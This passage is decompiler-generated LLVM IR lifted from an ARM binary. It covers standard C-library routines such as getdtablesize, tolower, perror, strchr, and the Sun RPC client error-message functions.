  store i32 %v3_1b9d0, i32* %ip.global-to-local, align 4
  %v0_1b9d4 = load i32, i32* %r5.global-to-local, align 4
  %v3_1b9d45 = udiv i32 %v0_1b9d4, 256
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_1b9dc = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_1b9dc, i32* %r3.global-to-local, align 4
  %v1_1b9e0 = trunc i32 %v3_1b9d45 to i8
  %v2_1b9e0 = load i32, i32* %r8.global-to-local, align 4
  %v3_1b9e0 = add i32 %v2_1b9e0, 1
  %v4_1b9e0 = inttoptr i32 %v3_1b9e0 to i8*
  store i8 %v1_1b9e0, i8* %v4_1b9e0, align 1
  %v0_1b9e4 = load i32, i32* %r6.global-to-local, align 4
  %v3_1b9e4 = sdiv i32 %v0_1b9e4, 256
  store i32 %v3_1b9e4, i32* %lr.global-to-local, align 4
  %v0_1b9ec = load i32, i32* %r2.global-to-local, align 4
  %v0_1b9f0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b9f0 = trunc i32 %v0_1b9f0 to i8
  %v2_1b9f0 = load i32, i32* %r8.global-to-local, align 4
  %v3_1b9f0 = inttoptr i32 %v2_1b9f0 to i8*
  store i8 %v1_1b9f0, i8* %v3_1b9f0, align 1
  %v0_1b9f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1b9f4 = trunc i32 %v0_1b9f4 to i8
  %v2_1b9f4 = load i32, i32* %sb.global-to-local, align 4
  %v3_1b9f4 = add i32 %v2_1b9f4, 1
  %v4_1b9f4 = inttoptr i32 %v3_1b9f4 to i8*
  store i8 %v1_1b9f4, i8* %v4_1b9f4, align 1
  %v0_1b9f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b9f8 = trunc i32 %v0_1b9f8 to i8
  %v2_1b9f8 = load i32, i32* %r8.global-to-local, align 4
  %v3_1b9f8 = add i32 %v2_1b9f8, 4
  %v4_1b9f8 = inttoptr i32 %v3_1b9f8 to i8*
  store i8 %v1_1b9f8, i8* %v4_1b9f8, align 1
  %v0_1b9fc = load i32, i32* %lr.global-to-local, align 4
  %v1_1b9fc = trunc i32 %v0_1b9fc to i8
  %v2_1b9fc = load i32, i32* %r3.global-to-local, align 4
  %v3_1b9fc = add i32 %v2_1b9fc, 1
  %v4_1b9fc = inttoptr i32 %v3_1b9fc to i8*
  store i8 %v1_1b9fc, i8* %v4_1b9fc, align 1
  %v2_1ba04 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1ba04, i32* @r4, align 4
  ret i32 %v0_1b9ec

; uselistorder directives
  uselistorder i32 %v2_1b9ac, { 1, 0 }
  uselistorder i32 %v2_1b9cc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1b9b0, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i8 1, { 9, 6, 2, 10, 4, 11, 12, 13, 14, 15, 16, 3, 0, 1, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 7, 40, 41, 42, 8, 43, 44, 5, 45, 46, 47, 48, 49 }
  uselistorder label %dec_label_pc_1b964, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_1ba10 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1ba10, i32* @r1, align 4
  %v2_1ba1c = call i32 @getrlimit(i32 7, i32 %v2_1ba10)
  %v1_1ba20 = icmp slt i32 %v2_1ba1c, 0
  br i1 %v1_1ba20, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v5_1ba28 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_1ba30 = phi i32 [ 256, %entry ], [ %v5_1ba28, %bb ]
  ret i32 %v5_1ba30

; uselistorder directives
  uselistorder i32 %v2_1ba10, { 1, 0 }
  uselistorder i32 (i32, i32)* @getrlimit, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1ba3c = icmp slt i32 %arg1, 0
  br i1 %v1_1ba3c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_1ba3c = mul i32 %arg1, 2
  %v2_1ba48 = load i32, i32* bitcast (i32** @global_var_2b8a0.666 to i32*), align 4
  %v2_1ba4c = add i32 %v2_1ba48, %v2_1ba3c
  %v3_1ba50 = inttoptr i32 %v2_1ba4c to i8*
  %v4_1ba50 = load i8, i8* %v3_1ba50, align 1
  %v6_1ba50 = zext i8 %v4_1ba50 to i32
  %v1_1ba54 = add i32 %v2_1ba4c, 1
  %v2_1ba54 = inttoptr i32 %v1_1ba54 to i8*
  %v3_1ba54 = load i8, i8* %v2_1ba54, align 1
  %v4_1ba54 = zext i8 %v3_1ba54 to i32
  %v3_1ba58 = mul nuw i32 %v4_1ba54, 16777216
  %v4_1ba5c = sdiv i32 %v3_1ba58, 65536
  %v5_1ba5c = or i32 %v4_1ba5c, %v6_1ba50
  ret i32 %v5_1ba5c

; uselistorder directives
  uselistorder i32 %v2_1ba4c, { 1, 0 }
}

define i32 @perror() local_unnamed_addr {
entry:
  %v0_1ba68 = load i32, i32* @r0, align 4
  %v2_1ba68 = icmp eq i32 %v0_1ba68, 0
  br i1 %v2_1ba68, label %dec_label_pc_1ba84, label %dec_label_pc_1ba74

dec_label_pc_1ba74:                               ; preds = %entry
  %v1_1ba74 = inttoptr i32 %v0_1ba68 to i8*
  %v2_1ba74 = load i8, i8* %v1_1ba74, align 1
  %v2_1ba78 = icmp eq i8 %v2_1ba74, 0
  br i1 %v2_1ba78, label %dec_label_pc_1ba84, label %bb

bb:                                               ; preds = %dec_label_pc_1ba74
  br label %dec_label_pc_1ba88

dec_label_pc_1ba84:                               ; preds = %dec_label_pc_1ba74, %entry
  br label %dec_label_pc_1ba88

dec_label_pc_1ba88:                               ; preds = %bb, %dec_label_pc_1ba84
  %v0_1ba90 = phi i32 [ %v0_1ba68, %bb ], [ ptrtoint (i32* @global_var_1eb2e.1056 to i32), %dec_label_pc_1ba84 ]
  %v0_1ba88 = phi i32 [ ptrtoint ([3 x i8]* @global_var_1eb2c.1058 to i32), %bb ], [ ptrtoint (i32* @global_var_1eb2e.1056 to i32), %dec_label_pc_1ba84 ]
  %v2_1ba94 = load i32, i32* @global_var_2b570, align 4
  store i32 %v2_1ba94, i32* @r0, align 4
  %v5_1ba9c = call i32 @fprintf(i32 %v2_1ba94, i32 ptrtoint ([8 x i8]* @global_var_1eb30.1061 to i32), i32 %v0_1ba90, i32 %v0_1ba88)
  ret i32 %v5_1ba9c

; uselistorder directives
  uselistorder label %dec_label_pc_1ba88, { 1, 0 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_1babc = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_1babc, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1bacc = call i32 @__GI_vfprintf()
  ret i32 %v0_1bacc

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_1bae0 = load i32, i32* @r5, align 4
  %v9_1bae0 = load i32, i32* @r6, align 4
  %v1_1bae4 = urem i32 %arg1, 256
  br label %dec_label_pc_1bb04

dec_label_pc_1baec:                               ; preds = %dec_label_pc_1bb04
  %v3_1baec = load i8, i8* %.0, align 1
  %v4_1baec = zext i8 %v3_1baec to i32
  %v9_1baf0 = icmp eq i32 %v4_1baec, %v1_1bae4
  br i1 %v9_1baf0, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_1baec
  ret i32 %v1_1bb04

bb24:                                             ; preds = %dec_label_pc_1baec
  %v2_1baf8 = icmp eq i8 %v3_1baec, 0
  %v2_1bafc = add i32 %v1_1bb04, 1
  %v3_1bafc = inttoptr i32 %v2_1bafc to i8*
  br i1 %v2_1baf8, label %dec_label_pc_1bbd8, label %dec_label_pc_1bb04

dec_label_pc_1bb04:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_1bafc, %bb24 ]
  %v1_1bb04 = ptrtoint i8* %.0 to i32
  %v2_1bb04 = urem i32 %v1_1bb04, 4
  %v3_1bb04 = icmp eq i32 %v2_1bb04, 0
  br i1 %v3_1bb04, label %dec_label_pc_1bb0c, label %dec_label_pc_1baec

dec_label_pc_1bb0c:                               ; preds = %dec_label_pc_1bb04
  %v4_1bb0c = mul nuw nsw i32 %v1_1bae4, 256
  %v5_1bb0c = or i32 %v4_1bb0c, %v1_1bae4
  %v4_1bb14 = mul i32 %v5_1bb0c, 65536
  %v5_1bb14 = or i32 %v4_1bb14, %v5_1bb0c
  br label %dec_label_pc_1bb18

dec_label_pc_1bb18:                               ; preds = %dec_label_pc_1bbd0, %dec_label_pc_1bb58, %dec_label_pc_1bb0c
  %v0_1bb7c = phi i32 [ %v1_1bb04, %dec_label_pc_1bb0c ], [ %v4_1bb18, %dec_label_pc_1bb58 ], [ %v4_1bb18, %dec_label_pc_1bbd0 ]
  %v1_1bb18 = inttoptr i32 %v0_1bb7c to i32*
  %v2_1bb18 = load i32, i32* %v1_1bb18, align 4
  %v4_1bb18 = add i32 %v0_1bb7c, 4
  %v2_1bb20 = xor i32 %v2_1bb18, %v5_1bb14
  %v2_1bb2c = add i32 %v2_1bb18, 2130640639
  %v1_1bb30 = sub i32 -1, %v2_1bb18
  %v2_1bb34 = xor i32 %v2_1bb2c, %v1_1bb30
  %v2_1bb38 = add i32 %v2_1bb20, 2130640639
  %v1_1bb40 = sub i32 -1, %v2_1bb20
  %v2_1bb44 = and i32 %v2_1bb34, -2130640640
  %v2_1bb48 = xor i32 %v2_1bb38, %v1_1bb40
  %v2_1bb4c = icmp eq i32 %v2_1bb44, 0
  %v2_1bb50 = and i32 %v2_1bb48, -2130640640
  store i32 %v2_1bb50, i32* @lr, align 4
  br i1 %v2_1bb4c, label %dec_label_pc_1bb58, label %dec_label_pc_1bb60

dec_label_pc_1bb58:                               ; preds = %dec_label_pc_1bb18
  %v2_1bb58 = icmp eq i32 %v2_1bb50, 0
  br i1 %v2_1bb58, label %dec_label_pc_1bb18, label %dec_label_pc_1bb60

dec_label_pc_1bb60:                               ; preds = %dec_label_pc_1bb18, %dec_label_pc_1bb58
  %v2_1bb60 = inttoptr i32 %v0_1bb7c to i8*
  %v3_1bb60 = load i8, i8* %v2_1bb60, align 1
  %v4_1bb60 = zext i8 %v3_1bb60 to i32
  %v1_1bb68 = add i32 %v0_1bb7c, 1
  %v1_1bb6c = add i32 %v0_1bb7c, 2
  %v9_1bb70 = icmp eq i32 %v4_1bb60, %v1_1bae4
  %v1_1bb74 = add i32 %v0_1bb7c, 3
  br i1 %v9_1bb70, label %dec_label_pc_1bb7c, label %dec_label_pc_1bb84

dec_label_pc_1bb7c:                               ; preds = %dec_label_pc_1bb60
  store i32 %v6_1bae0, i32* @r5, align 4
  store i32 %v9_1bae0, i32* @r6, align 4
  ret i32 %v0_1bb7c

dec_label_pc_1bb84:                               ; preds = %dec_label_pc_1bb60
  %v2_1bb84 = icmp eq i8 %v3_1bb60, 0
  br i1 %v2_1bb84, label %dec_label_pc_1bbd8, label %dec_label_pc_1bb8c

dec_label_pc_1bb8c:                               ; preds = %dec_label_pc_1bb84
  %v2_1bb8c = inttoptr i32 %v1_1bb68 to i8*
  %v3_1bb8c = load i8, i8* %v2_1bb8c, align 1
  %v4_1bb8c = zext i8 %v3_1bb8c to i32
  %v9_1bb90 = icmp eq i32 %v4_1bb8c, %v1_1bae4
  br i1 %v9_1bb90, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_1bb8c
  store i32 %v6_1bae0, i32* @r5, align 4
  store i32 %v9_1bae0, i32* @r6, align 4
  ret i32 %v1_1bb68

bb26:                                             ; preds = %dec_label_pc_1bb8c
  %v2_1bb98 = icmp eq i8 %v3_1bb8c, 0
  br i1 %v2_1bb98, label %dec_label_pc_1bbd8, label %dec_label_pc_1bba0

dec_label_pc_1bba0:                               ; preds = %bb26
  %v2_1bba0 = inttoptr i32 %v1_1bb6c to i8*
  %v3_1bba0 = load i8, i8* %v2_1bba0, align 1
  %v4_1bba0 = zext i8 %v3_1bba0 to i32
  %v9_1bba4 = icmp eq i32 %v4_1bba0, %v1_1bae4
  br i1 %v9_1bba4, label %dec_label_pc_1bbac, label %dec_label_pc_1bbb4

dec_label_pc_1bbac:                               ; preds = %dec_label_pc_1bba0
  store i32 %v6_1bae0, i32* @r5, align 4
  store i32 %v9_1bae0, i32* @r6, align 4
  ret i32 %v1_1bb6c

dec_label_pc_1bbb4:                               ; preds = %dec_label_pc_1bba0
  %v2_1bbb4 = icmp eq i8 %v3_1bba0, 0
  br i1 %v2_1bbb4, label %dec_label_pc_1bbd8, label %dec_label_pc_1bbbc

dec_label_pc_1bbbc:                               ; preds = %dec_label_pc_1bbb4
  %v2_1bbbc = inttoptr i32 %v1_1bb74 to i8*
  %v3_1bbbc = load i8, i8* %v2_1bbbc, align 1
  %v4_1bbbc = zext i8 %v3_1bbbc to i32
  %v9_1bbc0 = icmp eq i32 %v4_1bbbc, %v1_1bae4
  br i1 %v9_1bbc0, label %dec_label_pc_1bbc8, label %dec_label_pc_1bbd0

dec_label_pc_1bbc8:                               ; preds = %dec_label_pc_1bbbc
  store i32 %v6_1bae0, i32* @r5, align 4
  store i32 %v9_1bae0, i32* @r6, align 4
  ret i32 %v1_1bb74

dec_label_pc_1bbd0:                               ; preds = %dec_label_pc_1bbbc
  %v2_1bbd0 = icmp eq i8 %v3_1bbbc, 0
  br i1 %v2_1bbd0, label %dec_label_pc_1bbd8, label %dec_label_pc_1bb18

dec_label_pc_1bbd8:                               ; preds = %bb24, %dec_label_pc_1bbd0, %dec_label_pc_1bbb4, %bb26, %dec_label_pc_1bb84
  store i32 %v6_1bae0, i32* @r5, align 4
  store i32 %v9_1bae0, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1bb18, { 1, 0 }
  uselistorder i32 %v2_1bb18, { 0, 2, 1 }
  uselistorder i32 %v0_1bb7c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1bb0c, { 1, 0 }
  uselistorder i32 %v1_1bb04, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_1bae4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_1bae0, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_1bae0, { 3, 0, 1, 2, 4 }
  uselistorder i32 -2130640640, { 2, 5, 6, 7, 3, 0, 8, 4, 1 }
  uselistorder i32 2130640639, { 0, 1, 4, 2, 3 }
  uselistorder i8* undef, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1bbd8, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1bb60, { 1, 0 }
}

define i32 @__GI_clnt_sperrno() local_unnamed_addr {
entry:
  %v1_1bbf4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1bbf0

dec_label_pc_1bbf0:                               ; preds = %entry, %dec_label_pc_1bc10
  %v1_1bbfc6 = phi i32 [ 0, %entry ], [ %v1_1bc10, %dec_label_pc_1bc10 ]
  %v4_1bbf0 = mul i32 %v1_1bbfc6, 8
  %v5_1bbf0 = add i32 %v4_1bbf0, ptrtoint (i32* @global_var_1ece8.1067 to i32)
  %v6_1bbf0 = inttoptr i32 %v5_1bbf0 to i32*
  %v7_1bbf0 = load i32, i32* %v6_1bbf0, align 4
  %v9_1bbf4 = icmp eq i32 %v7_1bbf0, %v1_1bbf4.pre
  br i1 %v9_1bbf4, label %dec_label_pc_1bbfc, label %dec_label_pc_1bc10

dec_label_pc_1bbfc:                               ; preds = %dec_label_pc_1bbf0
  %v1_1bc00 = add i32 %v4_1bbf0, add (i32 ptrtoint (i32* @global_var_1ece8.1067 to i32), i32 4)
  %v2_1bc00 = inttoptr i32 %v1_1bc00 to i32*
  %v3_1bc00 = load i32, i32* %v2_1bc00, align 4
  %v2_1bc08 = add i32 %v3_1bc00, ptrtoint ([13 x i8]* @global_var_1ed78.1065 to i32)
  ret i32 %v2_1bc08

dec_label_pc_1bc10:                               ; preds = %dec_label_pc_1bbf0
  %v1_1bc10 = add i32 %v1_1bbfc6, 1
  %tmp = icmp ult i32 %v1_1bc10, 18
  br i1 %tmp, label %dec_label_pc_1bbf0, label %dec_label_pc_1bc20

dec_label_pc_1bc20:                               ; preds = %dec_label_pc_1bc10
  ret i32 ptrtoint ([26 x i8]* @global_var_1eb38.1069 to i32)

; uselistorder directives
  uselistorder i32 %v1_1bbfc6, { 1, 0 }
  uselistorder label %dec_label_pc_1bbf0, { 1, 0 }
}

define i32 @free_mem() local_unnamed_addr {
entry:
  %v0_1bc34 = load i32, i32* @lr, align 4
  %v0_1bc38 = call i32 @__rpc_thread_variables()
  %v1_1bc3c = add i32 %v0_1bc38, 156
  %v2_1bc3c = inttoptr i32 %v1_1bc3c to i32*
  %v3_1bc3c = load i32, i32* %v2_1bc3c, align 4
  store i32 %v3_1bc3c, i32* @r0, align 4
  store i32 %v0_1bc34, i32* @lr, align 4
  %v0_1bc44 = call i32 @free()
  ret i32 %v0_1bc44

; uselistorder directives
  uselistorder i32 ()* @free, { 42, 19, 40, 27, 25, 24, 23, 22, 21, 20, 15, 18, 13, 41, 38, 14, 39, 12, 11, 10, 9, 8, 7, 6, 17, 16, 5, 4, 3, 2, 1, 26, 33, 0, 37, 36, 29, 35, 34, 32, 31, 30, 28 }
}

define i32 @clnt_perrno(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1bc48 = load i32, i32* @lr, align 4
  %v0_1bc4c = call i32 @__GI_clnt_sperrno()
  %v2_1bc54 = load i32, i32* @global_var_2b570, align 4
  store i32 %v0_1bc48, i32* @lr, align 4
  %v2_1bc5c = call i32 @__GI_fputs(i32 %v0_1bc4c, i32 %v2_1bc54)
  %v0_1bc60 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1bc60, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  ret i32 %v2_1bc5c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @_buf() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_1bc64 = load i32, i32* @r4, align 4
  store i32 %v3_1bc64, i32* %stack_var_-8, align 4
  %v0_1bc68 = call i32 @__rpc_thread_variables()
  store i32 %v0_1bc68, i32* @r4, align 4
  %v1_1bc70 = add i32 %v0_1bc68, 156
  %v2_1bc70 = inttoptr i32 %v1_1bc70 to i32*
  %v3_1bc70 = load i32, i32* %v2_1bc70, align 4
  %v2_1bc74 = icmp eq i32 %v3_1bc70, 0
  br i1 %v2_1bc74, label %dec_label_pc_1bc80, label %dec_label_pc_1bc88

dec_label_pc_1bc80:                               ; preds = %entry
  %v1_1bc80 = call i32 @malloc(i32 256)
  %v1_1bc84 = load i32, i32* @r4, align 4
  %v2_1bc84 = add i32 %v1_1bc84, 156
  %v3_1bc84 = inttoptr i32 %v2_1bc84 to i32*
  store i32 %v1_1bc80, i32* %v3_1bc84, align 4
  %v0_1bc88.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1bc88

dec_label_pc_1bc88:                               ; preds = %entry, %dec_label_pc_1bc80
  %v0_1bc88 = phi i32 [ %v0_1bc68, %entry ], [ %v0_1bc88.pre, %dec_label_pc_1bc80 ]
  %v1_1bc88 = add i32 %v0_1bc88, 156
  %v2_1bc88 = inttoptr i32 %v1_1bc88 to i32*
  %v3_1bc88 = load i32, i32* %v2_1bc88, align 4
  %v2_1bc8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1bc8c, i32* @r4, align 4
  ret i32 %v3_1bc88

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 23, 6, 11, 8, 7, 3, 5, 24, 22, 2, 1, 21, 4, 25, 0, 10, 9, 17, 19, 20, 18, 16, 15, 14, 13, 12 }
  uselistorder i32 156, { 1, 2, 3, 0, 4 }
  uselistorder i32 ()* @__rpc_thread_variables, { 13, 18, 6, 17, 16, 15, 14, 12, 2, 0, 4, 11, 3, 10, 1, 9, 5, 8, 7 }
  uselistorder label %dec_label_pc_1bc88, { 1, 0 }
}

define i32 @clnt_spcreateerror() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-1044 = alloca i32, align 4
  %v3_1bc90 = load i32, i32* @r4, align 4
  %v6_1bc90 = load i32, i32* @r5, align 4
  %v9_1bc90 = load i32, i32* @r6, align 4
  %v12_1bc90 = load i32, i32* @r7, align 4
  %v2_1bc94 = ptrtoint i32* %stack_var_-1044 to i32
  %v0_1bc98 = load i32, i32* @r0, align 4
  store i32 %v0_1bc98, i32* @r4, align 4
  %v0_1bc9c = call i32 @_buf()
  store i32 %v0_1bc9c, i32* @r6, align 4
  %v2_1bca0 = icmp eq i32 %v0_1bc9c, 0
  br i1 %v2_1bca0, label %dec_label_pc_1bd7c, label %dec_label_pc_1bca8

dec_label_pc_1bca8:                               ; preds = %entry
  %v0_1bca8 = call i32 @__GI___rpc_thread_createerr()
  %v0_1bcac = load i32, i32* @r4, align 4
  store i32 %v0_1bca8, i32* @r5, align 4
  %v0_1bcb8 = load i32, i32* @r6, align 4
  store i32 %v0_1bcb8, i32* @r0, align 4
  %v4_1bcbc = call i32 @sprintf(i32 %v0_1bcb8, i32 ptrtoint ([5 x i8]* @global_var_1eb54.1072 to i32), i32 %v0_1bcac)
  %v0_1bcc0 = load i32, i32* @r6, align 4
  %v2_1bcc0 = add i32 %v0_1bcc0, %v4_1bcbc
  store i32 %v2_1bcc0, i32* %r4.global-to-local, align 4
  %v0_1bcc4 = load i32, i32* @r5, align 4
  %v1_1bcc4 = inttoptr i32 %v0_1bcc4 to i32*
  %v2_1bcc4 = load i32, i32* %v1_1bcc4, align 4
  store i32 %v2_1bcc4, i32* @r0, align 4
  %v0_1bcc8 = call i32 @__GI_clnt_sperrno()
  %v2_1bcd4 = inttoptr i32 %v0_1bcc8 to i8*
  %v3_1bcd4 = call i32 @strcpy(i32 %v2_1bcc0, i8* %v2_1bcd4)
  %v0_1bcd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bcd8 = inttoptr i32 %v0_1bcd8 to i8*
  %v3_1bcdc = call i32 @strlen(i8* %v1_1bcd8)
  %v0_1bce0 = load i32, i32* @r5, align 4
  %v1_1bce0 = inttoptr i32 %v0_1bce0 to i32*
  %v2_1bce0 = load i32, i32* %v1_1bce0, align 4
  store i32 %v2_1bce0, i32* %r3.global-to-local, align 4
  %v0_1bce4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1bce4 = add i32 %v0_1bce4, %v3_1bcdc
  store i32 %v2_1bce4, i32* %r4.global-to-local, align 4
  %v7_1bce8 = icmp eq i32 %v2_1bce0, 12
  br i1 %v7_1bce8, label %dec_label_pc_1bd34, label %dec_label_pc_1bcfc

dec_label_pc_1bcfc:                               ; preds = %dec_label_pc_1bca8
  %v7_1bcfc = icmp eq i32 %v2_1bce0, 14
  br i1 %v7_1bcfc, label %dec_label_pc_1bd04, label %dec_label_pc_1bd6c

dec_label_pc_1bd04:                               ; preds = %dec_label_pc_1bcfc
  %v4_1bd04 = call i32 @strcpy(i32 %v2_1bce4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1eb5c.1074, i32 0, i32 0))
  %v0_1bd08 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bd08 = inttoptr i32 %v0_1bd08 to i8*
  %v3_1bd0c = call i32 @strlen(i8* %v1_1bd08)
  %v2_1bd10 = add i32 %v0_1bd08, %v3_1bd0c
  store i32 %v2_1bd10, i32* @r4, align 4
  %v0_1bd14 = load i32, i32* @r5, align 4
  %v1_1bd14 = add i32 %v0_1bd14, 4
  %v2_1bd14 = inttoptr i32 %v1_1bd14 to i32*
  %v3_1bd14 = load i32, i32* %v2_1bd14, align 4
  store i32 %v3_1bd14, i32* @r0, align 4
  %v0_1bd18 = call i32 @__GI_clnt_sperrno()
  %v0_1bd20 = load i32, i32* @r4, align 4
  %v2_1bd24 = inttoptr i32 %v0_1bd18 to i8*
  %v3_1bd24 = call i32 @strcpy(i32 %v0_1bd20, i8* %v2_1bd24)
  %v0_1bd28 = load i32, i32* @r4, align 4
  %v1_1bd28 = inttoptr i32 %v0_1bd28 to i8*
  %v3_1bd2c = call i32 @strlen(i8* %v1_1bd28)
  br label %dec_label_pc_1bd68

dec_label_pc_1bd34:                               ; preds = %dec_label_pc_1bca8
  %v4_1bd34 = call i32 @strcpy(i32 %v2_1bce4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1eb5c.1074, i32 0, i32 0))
  %v0_1bd38 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bd38 = inttoptr i32 %v0_1bd38 to i8*
  %v3_1bd3c = call i32 @strlen(i8* %v1_1bd38)
  store i32 1024, i32* @r2, align 4
  %v2_1bd44 = add i32 %v0_1bd38, %v3_1bd3c
  store i32 %v2_1bd44, i32* @r4, align 4
  %v0_1bd4c = load i32, i32* @r5, align 4
  %v1_1bd4c = add i32 %v0_1bd4c, 8
  %v2_1bd4c = inttoptr i32 %v1_1bd4c to i32*
  %v3_1bd4c = load i32, i32* %v2_1bd4c, align 4
  store i32 %v3_1bd4c, i32* @r0, align 4
  %v3_1bd50 = call i32 @__GI___glibc_strerror_r(i32 %v3_1bd4c, i32 %v2_1bc94, i32 1024)
  %v0_1bd54 = load i32, i32* @r4, align 4
  %v2_1bd5c = bitcast i32* %stack_var_-1044 to i8*
  %v3_1bd5c = call i32 @strcpy(i32 %v0_1bd54, i8* %v2_1bd5c)
  %v0_1bd60 = load i32, i32* @r4, align 4
  %v1_1bd60 = inttoptr i32 %v0_1bd60 to i8*
  %v3_1bd64 = call i32 @strlen(i8* %v1_1bd60)
  br label %dec_label_pc_1bd68

dec_label_pc_1bd68:                               ; preds = %dec_label_pc_1bd04, %dec_label_pc_1bd34
  %storemerge = phi i32 [ %v3_1bd64, %dec_label_pc_1bd34 ], [ %v3_1bd2c, %dec_label_pc_1bd04 ]
  %v0_1bd68 = load i32, i32* @r4, align 4
  %v2_1bd68 = add i32 %v0_1bd68, %storemerge
  store i32 %v2_1bd68, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1bd6c

dec_label_pc_1bd6c:                               ; preds = %dec_label_pc_1bcfc, %dec_label_pc_1bd68
  %v2_1bd70 = phi i32 [ %v2_1bce4, %dec_label_pc_1bcfc ], [ %v2_1bd68, %dec_label_pc_1bd68 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1bd70 = add i32 %v2_1bd70, 1
  %v4_1bd70 = inttoptr i32 %v3_1bd70 to i8*
  store i8 0, i8* %v4_1bd70, align 1
  %v0_1bd74 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bd74 = add i32 %v0_1bd74, 10
  store i32 %v1_1bd74, i32* %r3.global-to-local, align 4
  %v1_1bd78 = trunc i32 %v1_1bd74 to i8
  %v2_1bd78 = load i32, i32* %r4.global-to-local, align 4
  %v3_1bd78 = inttoptr i32 %v2_1bd78 to i8*
  store i8 %v1_1bd78, i8* %v3_1bd78, align 1
  %v0_1bd7c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1bd7c

dec_label_pc_1bd7c:                               ; preds = %entry, %dec_label_pc_1bd6c
  %v0_1bd7c = phi i32 [ 0, %entry ], [ %v0_1bd7c.pre, %dec_label_pc_1bd6c ]
  store i32 %v3_1bc90, i32* @r4, align 4
  store i32 %v6_1bc90, i32* @r5, align 4
  store i32 %v9_1bc90, i32* @r6, align 4
  store i32 %v12_1bc90, i32* @r7, align 4
  ret i32 %v0_1bd7c

; uselistorder directives
  uselistorder i32* %r4.global-to-local, { 1, 0, 3, 2, 4, 5, 6, 7 }
  uselistorder i32 ()* @__GI___rpc_thread_createerr, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1bd7c, { 1, 0 }
  uselistorder label %dec_label_pc_1bd6c, { 1, 0 }
  uselistorder label %dec_label_pc_1bd68, { 1, 0 }
}

define i32 @clnt_pcreateerror(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1bd90 = load i32, i32* @lr, align 4
  %v0_1bd94 = call i32 @clnt_spcreateerror()
  %v2_1bd9c = load i32, i32* @global_var_2b570, align 4
  store i32 %v0_1bd90, i32* @lr, align 4
  %v2_1bda4 = call i32 @__GI_fputs(i32 %v0_1bd94, i32 %v2_1bd9c)
  %v0_1bda8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1bda8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  ret i32 %v2_1bda4

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_clnt_sperror() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-1056 = alloca i32, align 4
  %v3_1bdac = load i32, i32* @r4, align 4
  %v6_1bdac = load i32, i32* @r5, align 4
